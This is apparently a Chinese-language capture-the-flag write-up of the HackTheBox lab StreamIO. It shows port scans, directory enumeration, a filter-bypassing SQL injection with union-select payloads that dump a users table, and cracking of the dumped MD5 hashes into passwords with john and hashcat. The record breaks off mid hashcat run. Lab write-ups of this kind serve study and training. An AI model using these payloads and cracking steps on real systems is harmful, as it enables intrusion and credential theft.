靶机为HTB的域渗透靶机StreamIO
![](Pasted%20image%2020241218204233.png)

# 端口扫描
### 全端口扫描

~~~
┌──(kali㉿kali)-[~/StreamIO]
└─$ sudo nmap -sT -p- --min-rate 5000 10.10.11.158 -oA nmap/ports                                          
# Nmap 7.94SVN scan initiated Wed Dec 18 07:53:53 2024 as: /usr/lib/nmap/nmap -sT -p- --min-rate 5000 -oA nmap/ports 10.10.11.158
Nmap scan report for 10.10.11.158
Host is up (0.080s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown

# Nmap done at Wed Dec 18 07:54:20 2024 -- 1 IP address (1 host up) scanned in 26.61 seconds

~~~

### 默认脚本扫描

扫描得到域名watch.streamIO.htb

~~~
┌──(kali㉿kali)-[~/StreamIO]
└─$ sudo nmap -sT -sC -sV -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,49667,49673,49674 10.10.11.158  -oA nmap/sC
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-18 07:55 EST
Nmap scan report for 10.10.11.158
Host is up (0.12s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-18 19:41:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2024-12-18T19:42:52+00:00; +6h45m28s from scanner time.
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-12-18T19:42:13
|_  start_date: N/A
|_clock-skew: mean: 6h45m27s, deviation: 0s, median: 6h45m27s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.82 seconds

~~~

### 漏洞脚本扫描

~~~
┌──(kali㉿kali)-[~/StreamIO]
└─$ sudo nmap -sT --script=vuln -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,49667,49673,49674 10.10.11.158 -oA nmap/vuln
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-18 07:55 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.11.158
Host is up (0.15s latency).

PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
|_ssl-ccs-injection: No reply from server (TIMEOUT)
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown

Host script results:
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR

Nmap done: 1 IP address (1 host up) scanned in 1090.12 seconds

~~~

![](Pasted%20image%2020241218210603.png)
# 修改hosts文件
~~~
┌──(kali㉿kali)-[~/StreamIO]
└─$ sudo vim /etc/hosts                                                                                                              
                                                                                                                                                                                                                                                                 
┌──(kali㉿kali)-[~/StreamIO]
└─$ cat /etc/hosts                             
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.158    watch.streamIO.htb
10.10.11.158    streamIO.htb

~~~


# 子域名枚举

仅有watch这个子域名

~~~
┌──(kali㉿kali)-[~/StreamIO]

└─$ sudo gobuster vhost -u https://streamio.htb/ --domain streamio.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -k -r -t 100

[sudo] password for kali:

===============================================================

Gobuster v3.6

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

===============================================================

[+] Url: https://streamio.htb/

[+] Method: GET

[+] Threads: 100

[+] Wordlist: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt

[+] User Agent: gobuster/3.6

[+] Timeout: 10s

[+] Append Domain: true

===============================================================

Starting gobuster in VHOST enumeration mode

===============================================================

Found: watch.streamio.htb Status: 200 [Size: 2829]

Found: xn--nckxa3g7cq2b5304djmxc-biz.streamio.htb Status: 400 [Size: 334]

Found: xn--cckcdp5nyc8g2837ahhi954c-jp.streamio.htb Status: 400 [Size: 334]

Found: xn--7ck2d4a8083aybt3yv-com.streamio.htb Status: 400 [Size: 334]

Found: xn--u9jxfma8gra4a5989bhzh976brkn72bo46f-com.streamio.htb Status: 400 [Size: 334]

Found: xn--y8jvc027l5cav97szrms90clsb-com.streamio.htb Status: 400 [Size: 334]

Found: xn--t8j3b111p8cgqtb3v9a8tm35k-jp.streamio.htb Status: 400 [Size: 334]

Found: xn--new-h93bucszlkray7gqe-jp.streamio.htb Status: 400 [Size: 334]

Found: xn--2-uc7a56k9z0ag5f2zfgq0d-jp.streamio.htb Status: 400 [Size: 334]

Found: xn--68j4bva0f0871b88tc-com.streamio.htb Status: 400 [Size: 334]

Found: xn--68jza6c5o5cqhlgz994b-jp.streamio.htb Status: 400 [Size: 334]

Found: xn--u9j5h1btf1e9236atkap9eil-jp.streamio.htb Status: 400 [Size: 334]

Found: xn--zck3adi4kpbxc7d2131c5g2au9css5o-jp.streamio.htb Status: 400 [Size: 334]

Found: xn--u9j5h1btf1en15qnfb9z6hxg3a-jp.streamio.htb Status: 400 [Size: 334]

Found: xn--54qq0q0en86ikgxilmjza-biz.streamio.htb Status: 400 [Size: 334]

Found: xn--qckr4fj9ii2a7e-jp.streamio.htb Status: 400 [Size: 334]
~~~

# 139/445(SMB)

开了SMB服务，先用smbmap查看SMB的信息，发现无果

~~~
┌──(kali㉿kali)-[~/StreamIO]
└─$ smbmap -H 10.10.11.158                                       

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[*] Closed 1 connections       
~~~

用smbclient登录也被拒绝

~~~
┌──(kali㉿kali)-[~/StreamIO]
└─$ smbclient -L 10.10.11.158    
Password for [WORKGROUP\kali]:
session setup failed: NT_STATUS_ACCESS_DENIED
~~~

# 80(HTTP)
http://streamio.htb看起来是IIS的默认页，http://watch.streamio.htb也是相同的默认页
没什么其他的信息了，暂且搁置

![](Pasted%20image%2020241218210704.png)

# 443(HTTPS)
### 访问https://streamio.htb
是一个流媒体网站的介绍页

![](Pasted%20image%2020241218214231.png)

对https://streamio.htb进行目录扫描

![](Pasted%20image%2020241218214113.png)
### feroxbuster
~~~
┌──(kali㉿kali)-[~/StreamIO]
└─$ feroxbuster -u https://streamio.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt  -k
                                                                                                                                
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://streamio.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l       10w      151c https://streamio.htb/images => https://streamio.htb/images/
301      GET        2l       10w      147c https://streamio.htb/js => https://streamio.htb/js/
301      GET        2l       10w      150c https://streamio.htb/admin => https://streamio.htb/admin/
301      GET        2l       10w      148c https://streamio.htb/css => https://streamio.htb/css/
200      GET      101l      173w     1663c https://streamio.htb/css/responsive.css
200      GET      913l     5479w   420833c https://streamio.htb/images/about-img.png
200      GET      192l     1006w    82931c https://streamio.htb/images/icon.png
200      GET      206l      430w     6434c https://streamio.htb/contact.php
200      GET        5l      374w    21257c https://streamio.htb/js/popper.min.js
200      GET        2l     1276w    88145c https://streamio.htb/js/jquery-3.4.1.min.js
200      GET       51l      213w    19329c https://streamio.htb/images/client.jpg
200      GET      367l     1995w   166220c https://streamio.htb/images/contact-img.png
200      GET      111l      269w     4145c https://streamio.htb/login.php
200      GET      395l      915w    13497c https://streamio.htb/index.php
200      GET      863l     1698w    16966c https://streamio.htb/css/style.css
200      GET      231l      571w     7825c https://streamio.htb/about.php
200      GET      395l      915w    13497c https://streamio.htb/
301      GET        2l       10w      157c https://streamio.htb/admin/images => https://streamio.htb/admin/images/
301      GET        2l       10w      153c https://streamio.htb/admin/js => https://streamio.htb/admin/js/
301      GET        2l       10w      154c https://streamio.htb/admin/css => https://streamio.htb/admin/css/
301      GET        2l       10w      150c https://streamio.htb/fonts => https://streamio.htb/fonts/
301      GET        2l       10w      156c https://streamio.htb/admin/fonts => https://streamio.htb/admin/fonts/
404      GET       40l      156w     1888c https://streamio.htb/con
404      GET       40l      156w     1895c https://streamio.htb/images/con
404      GET       40l      156w     1891c https://streamio.htb/js/con
404      GET       40l      156w     1894c https://streamio.htb/admin/con
404      GET       40l      156w     1892c https://streamio.htb/css/con
404      GET       40l      156w     1901c https://streamio.htb/admin/images/con
404      GET       40l      156w     1897c https://streamio.htb/admin/js/con
404      GET       40l      156w     1898c https://streamio.htb/admin/css/con
404      GET       40l      156w     1894c https://streamio.htb/fonts/con
404      GET       40l      156w     1900c https://streamio.htb/admin/fonts/con
404      GET       40l      156w     1888c https://streamio.htb/aux
404      GET       40l      156w     1895c https://streamio.htb/images/aux
404      GET       40l      156w     1891c https://streamio.htb/js/aux
404      GET       40l      156w     1894c https://streamio.htb/admin/aux
404      GET       40l      156w     1892c https://streamio.htb/css/aux
404      GET       40l      156w     1901c https://streamio.htb/admin/images/aux
404      GET       40l      156w     1897c https://streamio.htb/admin/js/aux
404      GET       40l      156w     1898c https://streamio.htb/admin/css/aux
404      GET       40l      156w     1894c https://streamio.htb/fonts/aux
404      GET       40l      156w     1900c https://streamio.htb/admin/fonts/aux
400      GET        6l       26w      324c https://streamio.htb/error%1F_log
400      GET        6l       26w      324c https://streamio.htb/images/error%1F_log
400      GET        6l       26w      324c https://streamio.htb/js/error%1F_log
400      GET        6l       26w      324c https://streamio.htb/admin/error%1F_log
400      GET        6l       26w      324c https://streamio.htb/css/error%1F_log
400      GET        6l       26w      324c https://streamio.htb/admin/images/error%1F_log
400      GET        6l       26w      324c https://streamio.htb/admin/js/error%1F_log
400      GET        6l       26w      324c https://streamio.htb/admin/css/error%1F_log
400      GET        6l       26w      324c https://streamio.htb/fonts/error%1F_log
400      GET        6l       26w      324c https://streamio.htb/admin/fonts/error%1F_log
404      GET       40l      156w     1888c https://streamio.htb/prn
404      GET       40l      156w     1895c https://streamio.htb/images/prn
404      GET       40l      156w     1891c https://streamio.htb/js/prn
404      GET       40l      156w     1894c https://streamio.htb/admin/prn
404      GET       40l      156w     1892c https://streamio.htb/css/prn
404      GET       40l      156w     1901c https://streamio.htb/admin/images/prn
404      GET       40l      156w     1897c https://streamio.htb/admin/js/prn
404      GET       40l      156w     1898c https://streamio.htb/admin/css/prn
404      GET       40l      156w     1894c https://streamio.htb/fonts/prn
404      GET       40l      156w     1900c https://streamio.htb/admin/fonts/prn
[####################] - 5m    265881/265881  0s      found:62      errors:0      
[####################] - 5m     26584/26584   94/s    https://streamio.htb/ 
[####################] - 5m     26584/26584   94/s    https://streamio.htb/images/ 
[####################] - 5m     26584/26584   94/s    https://streamio.htb/js/ 
[####################] - 5m     26584/26584   94/s    https://streamio.htb/admin/ 
[####################] - 5m     26584/26584   94/s    https://streamio.htb/css/ 
[####################] - 5m     26584/26584   94/s    https://streamio.htb/admin/images/ 
[####################] - 5m     26584/26584   94/s    https://streamio.htb/admin/js/ 
[####################] - 5m     26584/26584   94/s    https://streamio.htb/admin/css/ 
[####################] - 5m     26584/26584   94/s    https://streamio.htb/fonts/ 
[####################] - 5m     26584/26584   94/s    https://streamio.htb/admin/fonts/             
~~~

### gobuster
~~~
┌──(kali㉿kali)-[~/StreamIO]
└─$ sudo gobuster dir -u https://streamio.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x .txt,.html,.php -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://streamio.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 151] [--> https://streamio.htb/images/]
/index.php            (Status: 200) [Size: 13497]
/contact.php          (Status: 200) [Size: 6434]
/about.php            (Status: 200) [Size: 7825]
/login.php            (Status: 200) [Size: 4145]
/register.php         (Status: 200) [Size: 4500]
/Images               (Status: 301) [Size: 151] [--> https://streamio.htb/Images/]
/admin                (Status: 301) [Size: 150] [--> https://streamio.htb/admin/]
/css                  (Status: 301) [Size: 148] [--> https://streamio.htb/css/]
/Contact.php          (Status: 200) [Size: 6434]
/About.php            (Status: 200) [Size: 7825]
/Index.php            (Status: 200) [Size: 13497]
/Login.php            (Status: 200) [Size: 4145]
/js                   (Status: 301) [Size: 147] [--> https://streamio.htb/js/]
/logout.php           (Status: 302) [Size: 0] [--> https://streamio.htb/]
/Register.php         (Status: 200) [Size: 4500]
/fonts                (Status: 301) [Size: 150] [--> https://streamio.htb/fonts/]
/IMAGES               (Status: 301) [Size: 151] [--> https://streamio.htb/IMAGES/]
^C
[!] Keyboard interrupt detected, terminating.
Progress: 14710 / 882244 (1.67%)
===============================================================
Finished
===============================================================


~~~

发现about.php和login.php还有一个admin目录但是被forbidden了
在about.php得到三个用户名

![](Pasted%20image%2020241218215416.png)

做一个用户名的字典
~~~
┌──(kali㉿kali)-[~/StreamIO]
└─$ cat users.txt   
Barry
Oliver
Samantha
admin

~~~

有一个登录框，尝试了几组简单的弱口令和脏sql，都是失败

![](Pasted%20image%2020241219134711.png)

发现有注册的入口，尝试注册

![](Pasted%20image%2020241219134754.png)

注册一个账户lizi:123456

再用新注册的账户尝试登录，还是失败

![](Pasted%20image%2020241219141212.png)



### 访问watch.streamIO.htb

似乎提供了一个通过邮件地址进行视频网站订阅的服务

![](Pasted%20image%2020241218210932.png)

有输入框可以输入邮件地址

![](Pasted%20image%2020241218211051.png)

对他进行目录扫描

### feroxbuster

~~~
                                                                                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/StreamIO]
└─$ sudo feroxbuster -u https://watch.streamio.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -k -x txt,php,html
                                                                                                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://watch.streamio.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, html]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       72l      112w      875c https://watch.streamio.htb/static/css/index.css
200      GET      136l      295w    22042c https://watch.streamio.htb/static/logo.png
200      GET       78l      245w     2829c https://watch.streamio.htb/index.php
200      GET      192l     1006w    82931c https://watch.streamio.htb/static/icon.png
200      GET       78l      245w     2829c https://watch.streamio.htb/
200      GET       25l       34w      247c https://watch.streamio.htb/static/css/search.css
200      GET    10837l    20418w   195704c https://watch.streamio.htb/static/css/bootstrap.css
200      GET     7193l    19558w   253905c https://watch.streamio.htb/search.php
403      GET       29l       92w     1233c https://watch.streamio.htb/static/css/
403      GET       29l       92w     1233c https://watch.streamio.htb/static/
301      GET        2l       10w      157c https://watch.streamio.htb/static => https://watch.streamio.htb/static/
200      GET     7193l    19558w   253905c https://watch.streamio.htb/Search.php
301      GET        2l       10w      161c https://watch.streamio.htb/static/css => https://watch.streamio.htb/static/css/
200      GET       78l      245w     2829c https://watch.streamio.htb/Index.php
301      GET        2l       10w      160c https://watch.streamio.htb/static/js => https://watch.streamio.htb/static/js/
404      GET       40l      156w     1885c https://watch.streamio.htb/%20
404      GET       40l      156w     1896c https://watch.streamio.htb/static/css/%20
404      GET       40l      156w     1892c https://watch.streamio.htb/static/%20
404      GET       40l      156w     1895c https://watch.streamio.htb/static/js/%20
200      GET       78l      245w     2829c https://watch.streamio.htb/INDEX.php
400      GET       80l      276w     3420c https://watch.streamio.htb/*checkout*
400      GET       80l      276w     3420c https://watch.streamio.htb/static/css/*checkout*
400      GET       80l      276w     3420c https://watch.streamio.htb/static/*checkout*
400      GET       80l      276w     3420c https://watch.streamio.htb/static/js/*checkout*
301      GET        2l       10w      161c https://watch.streamio.htb/static/CSS => https://watch.streamio.htb/static/CSS/
301      GET        2l       10w      160c https://watch.streamio.htb/static/JS => https://watch.streamio.htb/static/JS/
404      GET       40l      156w     1896c https://watch.streamio.htb/static/CSS/%20
404      GET       40l      156w     1895c https://watch.streamio.htb/static/JS/%20
[#>------------------] - 4m    292215/5293220 69m     found:28      errors:0      
🚨 Caught ctrl+c 🚨 saving scan state to ferox-https_watch_streamio_htb-1734588842.state ...
[#>------------------] - 4m    292246/5293220 69m     found:28      errors:0      
[#>------------------] - 4m     61408/882184  244/s   https://watch.streamio.htb/ 
[#>------------------] - 4m     61008/882184  243/s   https://watch.streamio.htb/static/css/ 
[#>------------------] - 4m     61000/882184  243/s   https://watch.streamio.htb/static/ 
[#>------------------] - 4m     57044/882184  236/s   https://watch.streamio.htb/static/js/ 
[>-------------------] - 2m     26856/882184  189/s   https://watch.streamio.htb/static/CSS/ 
[>-------------------] - 2m     24200/882184  186/s   https://watch.streamio.htb/static/JS/            
~~~

### gobuster

~~~
┌──(kali㉿kali)-[~/StreamIO]
└─$ sudo gobuster dir -u https://watch.streamio.htb/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -k -x .txt,.html,.php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://watch.streamio.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 2829]
/search.php           (Status: 200) [Size: 253887]
/static               (Status: 301) [Size: 157] [--> https://watch.streamio.htb/static/]
/Search.php           (Status: 200) [Size: 253887]
/Index.php            (Status: 200) [Size: 2829]
/INDEX.php            (Status: 200) [Size: 2829]
/*checkout*           (Status: 400) [Size: 3420]
/*docroot*            (Status: 400) [Size: 3420]
/*                    (Status: 400) [Size: 3420]
/blocked.php          (Status: 200) [Size: 677]
/SEARCH.php           (Status: 200) [Size: 253887]
/http%3A%2F%2Fwww     (Status: 400) [Size: 3420]
/Static               (Status: 301) [Size: 157] [--> https://watch.streamio.htb/Static/]
/http%3A              (Status: 400) [Size: 3420]
/q%26a                (Status: 400) [Size: 3420]
/**http%3a            (Status: 400) [Size: 3420]
/*http%3A             (Status: 400) [Size: 3420]
/**http%3A            (Status: 400) [Size: 3420]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 3420]
/http%3A%2F%2Fblogs   (Status: 400) [Size: 3420]
/http%3A%2F%2Fblog    (Status: 400) [Size: 3420]
/**http%3A%2F%2Fwww   (Status: 400) [Size: 3420]
/s%26p                (Status: 400) [Size: 3420]
Progress: 387633 / 882244 (43.94%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 387692 / 882244 (43.94%)
===============================================================
Finished
===============================================================
                                                                         
~~~

发现存在search.php

![](Pasted%20image%2020241219141739.png)

存在搜索框，尝试一些脏sql

尝试' or 1=1 -- -被拦截，可能存在WAF

![](Pasted%20image%2020241219141842.png)

测了几组数据，发现or应该是被过滤的

使用payload  day' and 1=1 -- - 可以成功绕过

![](Pasted%20image%2020241219142221.png)

在尝试lizi' union select 1,2,3,4,5,6; -- -出现回显结果

![](Pasted%20image%2020241219143119.png)

![](Pasted%20image%2020241219143225.png)

查询所有数据库

![](Pasted%20image%2020241219144024.png)

查询streamio数据库的所有表
lizi' union select 1,name,3,4,5,6 from databases.sys.tables; -- -

![](Pasted%20image%2020241219144234.png)

查询所有列
lizi' UNION SELECT 1, name, 3, 4, 5, 6 FROM sys.columns WHERE object_id = OBJECT_ID('users'); -- -
![](Pasted%20image%2020241219144913.png)

查询users表中的数据

![](Pasted%20image%2020241219150834.png)

得到admin的密码哈希665a50ac9eaa781e4f7f04199db97a11，应该是md5，进行解密

~~~
┌──(kali㉿kali)-[~/StreamIO]
└─$ sudo john --format=raw-MD5 hash --wordlist=/usr/share/wordlists/rockyou.txt                                                           
[sudo] password for kali: 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=6
Press 'q' or Ctrl-C to abort, almost any other key for status
paddpadd         (?)     
1g 0:00:00:00 DONE (2024-12-19 02:11) 2.272g/s 10993Kp/s 10993Kc/s 10993KC/s paddybigballs..paddlef
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
                                    
~~~

得到admin的密码，尝试登录，结果失败了

![](Pasted%20image%2020241219151328.png)

再看一下其他人的用户名和密码，我们之前得到了网站开发员的名字Oliver，试一下他的密码

![](Pasted%20image%2020241219151445.png)

![](Pasted%20image%2020241219151522.png)

或者干脆收集一下所有人的凭据

~~~
:d41d8cd98f00b204e9800998ecf8427e
admin :665a50ac9eaa781e4f7f04199db97a11
Alexendra :1c2b3d8270321140e5153f6637d3ee53 
Austin :0049ac57646627b8d7aeaccf8b6a936f
Barbra :3961548825e3e21df5646cafe11c6c76
Barry :54c88b2dbd7b1a84012fabc1a4c73415
Baxter :22ee218331afd081b0dcd8115284bae3
Bruno :2a4e2cf22dd8fcb45adcb91be1e22ae8
Carmon :35394484d89fcfdb3c5e447fe749d213
Clara :ef8f3d30a856cf166fb8215aca93e9ff
Diablo :ec33265e5fc8c2f1b0c137bb7b3632b5
Garfield :8097cedd612cc37c29db152b6e9edbd3
Gloria :0cfaaaafb559f081df2befbe66686de0
James :c660060492d9edcaa8332d89c99c9239
Juliette :6dcd87740abb64edfa36d170f0d5450d
Lauren :08344b85b329d7efd611b7a7743e8a09
Lenord :ee0b8a0937abd60c2882eacb2f8dc49f
lizi :e10adc3949ba59abbe56e057f20f883e
Lucifer :7df45a9e3de3863807c026ba48e55fb3
Michelle :b83439b16f844bd6ffe35c02fe21b3c0
Oliver :fd78db29173a5cf701bd69027cb9bf6b
Robert :f03b910e2bd0313a23fdd7575f34a694
Robin :dc332fb5576e9631c9dae83f194f8e70
Sabrina :f87d3c0d6c8fd686aacc6627f1f493a5
Samantha :083ffae904143c4796e464dac33c1f7d
Stan :384463526d288edcc95fc3701e523bc7
Thane :3577c47eb1e12c8ba021611e1280753c
Theodore :925e5408ecb67aea449373d668b7359e
Victor :bf55e15b119860a6e6b5a164377da719
Victoria :b22abb47a02b52d5dfa27fb0b534f693
William :d62be0dc82071bccc1322d64ec5b6c51
yoshihide :b779ba15cedfd22a023c4d8bcf5f2332
~~~

使用hashcat进行破解

~~~
┌──(kali㉿kali)-[~/StreamIO]
└─$ hashcat hash --wordlist /usr/share/wordlists/rockyou.txt -m 0  --user
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-11th Gen Intel(R) Core(TM) i5-11400H @ 2.70GHz, 2999/6063 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashfile 'hash' on line 3 (Alexen...c2b3d8270321140e5153f6637d3ee53 ): Token length exception

* Token length exception: 1/32 hashes
  This error happens if the wrong hash type is specified, if the hashes are
  malformed, or if input is otherwise not as expected (for example, if the
  --username option is used but no username is present)

Hashes: 31 digests; 31 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

e10adc3949ba59abbe56e057f20f883e:123456                   
d41d8cd98f00b204e9800998ecf8427e:                         
3577c47eb1e12c8ba021611e1280753c:highschoolmusical        
ee0b8a0937abd60c2882eacb2f8dc49f:physics69i               
665a50ac9eaa781e4f7f04199db97a11:paddpadd                 
Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

